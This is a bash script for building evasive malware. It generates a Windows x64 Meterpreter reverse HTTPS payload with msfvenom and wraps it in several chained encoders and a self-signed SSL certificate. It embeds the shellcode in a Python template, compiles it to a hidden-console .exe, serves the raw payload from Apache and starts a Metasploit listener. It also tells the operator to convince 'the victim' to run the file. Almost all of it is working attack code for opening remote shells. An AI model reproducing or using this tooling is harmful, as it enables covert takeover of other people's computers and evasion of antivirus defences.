#!/bin/bash
SCRIPT=`realpath -s $0`
path=`dirname $SCRIPT`
source $path/lib/decoration.sh
source $path/lib/support.sh
localIp=$(hostname -I)
publicIp=$(curl -s http://whatismyip.akamai.com/)

startListener()
{
touch ${path}/output/meterpreter.rc
echo use exploit/multi/handler >> ${path}/output/meterpreter.rc
echo set PAYLOAD windows/x64/meterpreter/reverse_winhttps >> ${path}/output/meterpreter.rc
echo set LHOST $1 >> ${path}/output/meterpreter.rc
echo set LPORT $2 >> ${path}/output/meterpreter.rc
echo set HandlerSSLCert ${path}/output/batapatata.pem  >> ${path}/output/meterpreter.rc
echo set StagerVerifySSLCert true >> ${path}/output/meterpreter.rc
echo set sessionCommunicationTimeout 600 >> ${path}/output/meterpreter.rc
echo set ExitOnSession false >> ${path}/output/meterpreter.rc
echo run -j -z >> ${path}/output/meterpreter.rc
cat ${path}/output/meterpreter.rc
sleep 2
gnome-terminal -e "msfconsole -r ${path}/output/meterpreter.rc"
sleep 2
menu
}


menu(){
banner
echo
echo -e "What would you like to do?"
echo
echo "0) Create SSL signed payload integrated in python.  "
echo "1) Run installer  "
echo "2) Remove files from tmp and output"
echo ""
echo ""
echo ""
echo
echo -n "What would you like to do: "
read Menuchoice

case $Menuchoice in
0 ) createPayload
;;
1 )chmod 777 ${path}/setup/setup.sh
gnome-terminal -e ${path}/setup/setup.sh
menu
;;
2 ) rm -rf ${path}/tmp/* ${path}/output/*
menu
;;
* ) echo "Wrong input"
sleep 1 ;
menu
;;
esac
}




createPayload()
{
rm -rf ./tmp/* ./output/*
####################
echo -e $yellow"Please insert the Local Host or choose one from below (your local ip if your target is in the same lan or else your public ip )" $resetCollor
echo -e $yellow"0) Local IP is" $localIp $resetCollor
echo -e $yellow"1) Public IP is" $publicIp $resetCollor
echo -e $yellow"2) other..." $resetCollor
read -n 1 Menuchoice
case $Menuchoice in
0 ) ip=$localIp
;;
1 )ip=$publicIp
;;
2 ) echo -e $yellow"Enter ip" $resetCollor
read ip
;;
* ) echo -e $red"Wrong input" $resetCollor
sleep 1
;;
esac
while validIp $ip
do
echo -e $red"IP INVALID" $resetCollor
echo -e $yellow"Enter ip" $resetCollor
read ip
done
echo -e $yellow"Please insert a valid port (dont forget to forward the port if you are behind nat (1-65535) )" $resetCollor
echo -e $yellow"Advised and default port is [443] (https)" $resetCollor
defPort=443
read -e  port
port="${port:-$defPort}"
while isValidPort $port
do
echo -e $red"PORT INVALID" $resetCollor
echo -e $yellow"enter port" $resetCollor
read port
done
echo -e $yellow"Please insert a name for the output file" $resetCollor
echo -e $yellow"Default file name is [shell]" $resetCollor
defFileName=shell
read -e  fileName
fileName="${fileName:-$defFileName}"
clear
####################
echo -e $green"Creating ssl key...."$resetCollor
openssl req -new -subj /C=GB/ST=London/L=London/O=globsec/OU=IT/CN=example -newkey rsa:4096 -days 365 -nodes -x509 -keyout ${path}/tmp/rsaprivate.key -out ${path}/tmp/servercertificate.crt
cat ${path}/tmp/rsaprivate.key ${path}/tmp/servercertificate.crt > ${path}/output/batapatata.pem
echo -e $green"Starting postgresql..."$resetCollor
rm -rf ${path}/tmp/rsaprivate.key ${path}/tmp/servercertificate.crt
service postgresql start
echo -e $green"Starting apache...."$resetCollor
service apache2 start
#echo "Reinitializing metasploit database"
#msfdb reinit
echo -e $green"Creating payload...." $resetCollor
msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port --platform windows -a x64 HandlerSSLCert=${path}/output/batapatata.pem StagerVerifySSLCert=true -s 42 --smallest -e x86/shikata_ga_nai -i 9 -f raw |msfvenom --platform windows -a x64 -e x86/countdown -i 8 -f raw |msfvenom --platform windows -a x64 -e x86/call4_dword_xor -i 1 -b '\x00\x0a\x0d' -f c > ./tmp/payload
sed '1d' ${path}/tmp/payload  | sed 's/;//' > ${path}/tmp/rawPayload
cp ${path}/tmp/rawPayload /var/www/html
cp ${path}/template/payPy.py ${path}/tmp/payPy.py
sed -e '/shellcode = (/r././tmp/rawPayload' ${path}/tmp/payPy.py > ${path}/output/${fileName}.py
echo -e $green"Payload stored in ${path}/output/" $resetCollor
#rm ./tmp/*
cd ${path}/output
#wine pyinstaller --onefile --noconsole --noupx --nowindowed ./${fileName}.py
wine pyinstaller -F --noconsole --noupx -w ${path}/${fileName}.py
cd ..
cp ${path}/output/dist/${fileName}.exe ${path}/output/
rm -rf ${path}/output/dist
rm -rf ${path}/output/build
rm -rf ${path}/output/__pycache__
rm -f ${path}/output/${fileName}.spec
echo -e $green".Exe stored in ${path}/output/" $resetCollor
echo -e $yellow"Due to the nature of SSL you can only have one session open at a time..." $resetCollor
echo -e $yellow"Try convincing the victim to run it..." $resetCollor
echo -e $yellow"Start metasploit listener?[Y/n]" $resetCollor
defAnswer=y
read -e -n 1  answer
answer="${answer:-$defAnswer}"
case $answer in
        [Yy]* ) startListener $ip $port;;
        [Nn]* ) menu;;

    esac

}
#set window size to 200X100
printf '\e[8;100;200t'
isRoot
checkPreReq
menu
